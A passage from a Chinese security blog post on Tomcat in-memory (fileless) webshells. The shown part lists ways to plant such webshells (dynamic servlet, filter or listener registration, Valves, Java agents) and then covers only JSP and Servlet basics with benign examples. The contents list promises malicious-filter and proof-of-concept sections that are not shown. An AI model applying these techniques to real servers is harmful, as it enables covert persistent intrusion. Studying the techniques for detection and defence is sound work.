nav-level-5"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%B1%BB%E4%BA%86%E8%A7%A3"><span class="nav-number">1.2.0.1.1.</span> <span class="nav-text">相关类了解</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Filter%E9%93%BE-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.2.0.1.2.</span> <span class="nav-text">Filter链 流程分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#filter%E5%89%8D%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.2.0.1.3.</span> <span class="nav-text">&#x2F;filter前流程分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">1.2.0.1.4.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#filterConfigs"><span class="nav-number">1.2.0.1.4.1.</span> <span class="nav-text">filterConfigs</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filterDefs"><span class="nav-number">1.2.0.1.4.2.</span> <span class="nav-text">filterDefs</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filterMaps"><span class="nav-number">1.2.0.1.4.3.</span> <span class="nav-text">filterMaps</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.0.1.5.</span> <span class="nav-text">如何攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8CFilter"><span class="nav-number">1.2.0.1.5.1.</span> <span class="nav-text">动态注册Filter</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96StandardContext%E5%AF%B9%E8%B1%A1"><span class="nav-number">1.2.0.1.5.2.</span> <span class="nav-text">获取StandardContext对象</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8Ffilter"><span class="nav-number">1.2.0.1.5.3.</span> <span class="nav-text">创建恶意filter</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%B0%81%E8%A3%85"><span class="nav-number">1.2.0.1.5.4.</span> <span class="nav-text">如何封装</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.0.1.5.5.</span> <span class="nav-text">动态注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC"><span class="nav-number">1.2.0.1.5.6.</span> <span class="nav-text">最终POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">Listener型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACListener%E6%9E%84%E9%80%A0"><span class="nav-number">1.2.0.2.1.</span> <span class="nav-text">基本Listener构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Listener%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.2.0.2.2.</span> <span class="nav-text">Listener流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E8%BF%90%E8%A1%8C%E5%89%8D"><span class="nav-number">1.2.0.2.2.1.</span> <span class="nav-text">应用运行前</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E8%BF%90%E8%A1%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.0.2.2.2.</span> <span class="nav-text">应用运行过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.0.2.2.3.</span> <span class="nav-text">注入过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC-1"><span class="nav-number">1.2.0.2.2.4.</span> <span class="nav-text">最终POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sevlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">Sevlet型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">1.2.0.3.1.</span> <span class="nav-text">调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90servlet%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.0.3.1.1.</span> <span class="nav-text">调试分析servlet的加载过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90servlet%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.0.3.1.2.</span> <span class="nav-text">调试分析servlet的初始化过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="nav-number">1.2.0.3.1.3.</span> <span class="nav-text">注入过程</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC-2"><span class="nav-number">1.2.0.3.1.4.</span> <span class="nav-text">最终POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.2.0.4.</span> <span class="nav-text">Valve 型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC-3"><span class="nav-number">1.2.0.4.0.1.</span> <span class="nav-text">最终POC</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Fupanc"
      src="/images/123.jpg">
  <p class="site-author-name" itemprop="name">Fupanc</p>
  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">27</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/123.jpg">
      <meta itemprop="name" content="Fupanc">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Fupanc">
      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Tomcat内存马 | Fupanc">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Tomcat内存马
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-05 09:00:16 / 修改时间：09:01:49" itemprop="dateCreated datePublished" datetime="2024-09-05T09:00:16+08:00">2024-09-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/" itemprop="url" rel="index"><span itemprop="name">Java内存马</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">Tomcat内存马学习</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>56k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1:41</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>Java内存马学习·</p>
<span id="more"></span>

<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p>内存马即仅存在于内存中的无文件恶意代码。也就是无文件落地的 webshell 技术。</p>
<p>webshell实际上也是一种web服务，那么从创建web服务的角度来看，有下面几种手段和思路：</p>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用职责链设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>
<p>Tomcat内存马也是经常用的。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><p><strong>在学习内存马之前，先了解一下jsp技术。</strong></p>
<p>JSP全名为Java Server Pages，是一种动态网页开发技术，其根本是一个简化的Serrvlet设计，它是在传统的网页HTML中插入java程序段和JSP标记，从而让形成JSP文件（.jsp）。</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><h5 id="脚本程序"><a href="#脚本程序" class="headerlink" title="脚本程序"></a>脚本程序</h5><p>脚本程序可以包含任意量的Java语句、变量、方法或表达式，语法格式为：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure>

<p>简单给一个jsp示例：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.println(<span class="string">&quot;成功调用脚本程序&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h5><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，需要先声明这些变量和方法才能使用它们。</p>
<p>JSP声明的语法格式：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declared; %&gt;</span><br></pre></td></tr></table></figure>

<p>等价于下面的XML语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;   </span><br><span class="line">代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; %&gt; </span><br></pre></td></tr></table></figure>

<h5 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h5><p>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。</p>
<p>由于表达式的值会被转化成String，所以可以在一个文本行中使用表达式而不用管它是否是HTML标签。</p>
<p><strong>需要注意的是</strong>：表达式元素中可以包含任何Java语言，但是不能用分号来结束表达式。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式 %&gt;</span><br></pre></td></tr></table></figure>

<p>等价于下面的XML表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;   表达式&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    今天的日期是: &lt;%= (<span class="keyword">new</span> <span class="title class_">java</span>.util.Date()).toLocaleString()%&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>页面为：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830141645804.png" alt="image-20240830141645804"></p>
<p>所以想要在页面上有回显可以使用脚本程序或者表达式。</p>
<h5 id="JSP注释"><a href="#JSP注释" class="headerlink" title="JSP注释"></a><strong>JSP注释</strong></h5><p>JSP注释主要有两个作用：为代码作注释以及将某段代码注释掉。</p>
<p>语法：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--注释--%&gt;</span><br></pre></td></tr></table></figure>

<p>这样注释内容就不会被发送至浏览器并且不会被编译。</p>
<h4 id="JSP指令"><a href="#JSP指令" class="headerlink" title="JSP指令"></a>JSP指令</h4><p>JSP指令用来设置整个JSP页面相关的属性，如网页编码方式和脚本语言。</p>
<p>语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ directive attribute=&quot;value&quot; %&gt;</span><br></pre></td></tr></table></figure>

<p>指令可以有很多格属性，它们以键值对的形式存在，并用逗号隔开。</p>
<p>JSP中的三种指令标签：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;%@ page .. %&gt;</td>
<td>定义网页依赖属性，比如脚本语言、error页面、缓存需求等等</td>
</tr>
<tr>
<td>&lt;%@ include — %&gt;</td>
<td>包含其他文件</td>
</tr>
<tr>
<td>&lt;%@ taglib … %&gt;</td>
<td>引入标签库的定义</td>
</tr>
</tbody></table>
<p><strong>简单说说include指令</strong>，JSP可以通过include指令来包含其他文件。被包含的文件可以是JSP文件、HTML文件或文本文件。包含的文件就好像是该JSP文件的一部分，会被同时编译执行。</p>
<p>include指令的语法格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=&quot;文件相对 url 地址&quot; %&gt;</span><br></pre></td></tr></table></figure>

<p>等价的XML语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.include file=&quot;文件相对 url 地址&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>等可参考：<code>https://www.runoob.com/jsp/jsp-directives.html</code>，还是很有想法的。</p>
<h4 id="JSP隐式对象"><a href="#JSP隐式对象" class="headerlink" title="JSP隐式对象"></a>JSP隐式对象</h4><p>JSP隐式对象时JSP容器为每个页面提供的Java对象，开发者可以直接使用它们而不用显示声明。JSP隐式对象也被称为预定义变量，JSP所支持的九大隐式对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">request：HttpServletRequest接口的实例</span><br><span class="line">response：HttpServletResponse 接口的实例</span><br><span class="line">out：JspWrite类的实例，用于把结果输出至网页上</span><br><span class="line">session：HttpSession类的实例</span><br><span class="line">application：ServletContext类的实例</span><br><span class="line">config：ServletConfig类的实例</span><br><span class="line">pageContext：PageContext类的实例，提供对JSP页面所有对象以及命令空间的访问</span><br><span class="line">page：类似与java中的this关键字</span><br><span class="line">Exception：Exception类的对象，代表发生错误的JSP页面中对应的异常对象</span><br></pre></td></tr></table></figure>

<p>详细说明，比如</p>
<ul>
<li><strong>request对象</strong>提供了一系列方法来获取HTTP头信息，cookies，HTTP方法等，服务端需要通过request对象拿到需要的数据，然后做出响应。</li>
</ul>
<p>常用方法：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;喻志强&quot;</span>);	<span class="comment">//往request对象中存储一个值  key-value的形式</span></span><br><span class="line">    request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);	<span class="comment">//设置编码格式</span></span><br><span class="line"></span><br><span class="line">    request.getParameter(<span class="string">&quot;&quot;</span>);<span class="comment">//获取提交的指定参数的值</span></span><br><span class="line">    request.getParameterNames();<span class="comment">//返回请求中所有参数的集合</span></span><br><span class="line">    request.getParameterValues(<span class="string">&quot;&quot;</span>);<span class="comment">//获取包含指定参数的所有值的数组</span></span><br><span class="line">    request.getAttributeNames();<span class="comment">//获取所有属性名称集合</span></span><br><span class="line">    request.getAttribute(<span class="string">&quot;name&quot;</span>);<span class="comment">//获取指定属性的属性值,如果不存在返回null</span></span><br><span class="line">    request.getCharacterEncoding();<span class="comment">//获取编码格式</span></span><br><span class="line">    request.getProtocol();<span class="comment">//获取HTTP使用的协议</span></span><br><span class="line">    request.getServletPath();<span class="comment">//获取用户提交信息的页面的路径</span></span><br><span class="line">    request.getMethod();<span class="comment">//获取用户提交的方式（GET/POST 等）</span></span><br><span class="line">    request.getHeaderNames();<span class="comment">//返回所有HTTP头的名称集合</span></span><br><span class="line">    request.getHeader(<span class="string">&quot;&quot;</span>);<span class="comment">//获取header中指定属性的值</span></span><br><span class="line">    request.getRemoteAddr();<span class="comment">//获取用户的ip地址</span></span><br><span class="line">    request.getRemoteHost();<span class="comment">//获取用户的主机名</span></span><br><span class="line">    request.getServerName();<span class="comment">//获取服务器的名称</span></span><br><span class="line">    request.getServerPort();<span class="comment">//获取服务器端口号</span></span><br><span class="line">    request.getCookies();<span class="comment">//返回客户端所有的Cookie的数组</span></span><br><span class="line">    request.getSession();<span class="comment">//返回request对应的session对象，如果没有，则创建一个</span></span><br><span class="line">    request.getInputStream();<span class="comment">//返回请求的输入流</span></span><br><span class="line">    request.getContextPath();<span class="comment">//返回request URI中指明的上下文路径</span></span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;result.jsp&quot;</span>).forward(request,response);<span class="comment">//请求转发</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>response对象</strong>对应着http请求的响应，其封装了响应体的信息，我们可以通过response对象向客户端返回数据。</li>
</ul>
<p>常用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.getOutputStream();//返回一个响应二进制的输出流</span><br><span class="line">response.getWrite();//返回可以输出字符的对象</span><br><span class="line">response.sendRedirect(&quot;&quot;);//页面重定向</span><br><span class="line">response.setContextLength(1000);//设置响应头长度</span><br><span class="line">response.setContentType(&quot;text/html; charset=utf-8&quot;);//设置响应的MIME类型</span><br><span class="line">response.getCharacterEncoding();//获取编码格式</span><br><span class="line">response.addCookie(new Cookie(&quot;&quot;,&quot;&quot;));//添加Cookie</span><br><span class="line">response.setHeader(&quot;Content-Disposition&quot;,&quot;attachment; filename=fileName&quot;);//配置header，表示浏览器已下载的方式打开文件</span><br><span class="line">response.setStatus(200);//设置响应码</span><br></pre></td></tr></table></figure>

<ul>
<li>session对象用来跟踪在各个刻画段请求间的会话。</li>
</ul>
<p>session主要用于会话跟踪，可以用来共享数据，例如登录的用户信息等等。</p>
<p>一次会话可能包含对此request和response。</p>
<p>常用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    session.setAttribute(&quot;name&quot;, &quot;yzq&quot;); </span><br><span class="line">    session.setAttribute(&quot;age&quot;, 25);</span><br><span class="line">    session.getCreationTime();//获取创建时间</span><br><span class="line">    session.getId();//获取sessionid</span><br><span class="line">    session.invalidate();//取消session，使session不可用</span><br><span class="line">    session.removeAttribute(&quot;name&quot;);//移除某个属性</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li><strong>out对象</strong>用于在response对象中写入内容，有如下方法用来输出：</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>out.print(data Type dt)</td>
<td>输出Type类型的值</td>
</tr>
<tr>
<td>out.println(data Type dt)</td>
<td>输出Type类型的值然后换行</td>
</tr>
<tr>
<td>out.flush()</td>
<td>刷新输出流</td>
</tr>
</tbody></table>
<p>等</p>
<p>还有的其他JSP技术参考菜鸟教程的：<code>https://www.runoob.com/jsp/jsp-tutorial.html</code></p>
<h3 id="Tomcat架构学习"><a href="#Tomcat架构学习" class="headerlink" title="Tomcat架构学习"></a>Tomcat架构学习</h3><p>学习Tomcat内存马，自然需要学习Tomcat架构。</p>
<h4 id="Java-Web三大件"><a href="#Java-Web三大件" class="headerlink" title="Java Web三大件"></a>Java Web三大件</h4><p>Java Web三大件：Servlet，Filter，Listener。</p>
<p>当Tomcat 接收到请求的时候，依次会经过 Listener -&gt; Filter -&gt; Servlet</p>
<h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><p>Java Servlet 是运行在Web服务器或应用服务器上的小型Java程序，它是作为来自Web 浏览器或其他 HTTP 客户端的请求的 HTTP服务器上的数据库或应用程序之间的中间层。一般的位置如下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830171852073.png" alt="image-20240830171852073"></p>
<h6 id="请求的处理过程"><a href="#请求的处理过程" class="headerlink" title="请求的处理过程"></a>请求的处理过程</h6><ul>
<li>客户端发起一个http请求，比如get类型</li>
<li>Servlet 容器接收到请求，根据请求信息，封装成 HttpServletRequest 和 HttpServletResponse 对象。</li>
<li>Servlet 容器调用 HttpServlet 的 init()方法，init方法只在第一次请求的时候被调用。</li>
<li>Servlet 容器调用 service() 方法</li>
<li>service() 方法根据请求类型，分别调用doGet或者doPost方法。</li>
<li>doXXX方法中是我们可以自定义的业务逻辑。</li>
<li>业务逻辑处理完成之后，返回给Servlet 容器，然后容器将结果返回给客户端。</li>
<li>容器关闭时候，会调用 destory 方法。</li>
</ul>
<p>可以用如下代码来自定义业务逻辑：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/TestServlet&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        response.getWriter().write(<span class="string">&quot;hello Drunbaby&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后指定访问这个java文件即可进行自定义的业务逻辑。</p>
<h6 id="servlet-生命周期"><a href="#servlet-生命周期" class="headerlink" title="servlet 生命周期"></a>servlet 生命周期</h6><ol>
